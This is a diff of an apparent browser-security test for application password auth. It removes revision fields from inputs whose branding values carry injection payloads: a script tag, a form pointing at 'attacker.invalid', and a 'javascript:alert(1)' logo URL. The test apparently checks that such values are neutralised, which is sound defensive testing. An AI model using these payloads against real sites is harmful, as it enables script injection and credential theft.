@@ -204,7 +204,7 @@ test.describe('Application password auth — browser and transport security', ()
         input: {
           organizationId: composeGlobalId('Organization', realm.organizationId),
           applicationId: composeGlobalId('Application', realm.applicationId),
-          expectedRevision: revision,
+          
           branding: {
             displayName: `<script>${marker}</script>`,
             headline: `"><form action="https://attacker.invalid">${marker}`,
@@ -221,7 +221,7 @@ test.describe('Application password auth — browser and transport security', ()
         input: {
           organizationId: composeGlobalId('Organization', realm.organizationId),
           applicationId: composeGlobalId('Application', realm.applicationId),
-          expectedRevision: escapedPayload.configuration!.revision,
+          
           branding: {
             logoUrl: 'javascript:alert(1)',
           },
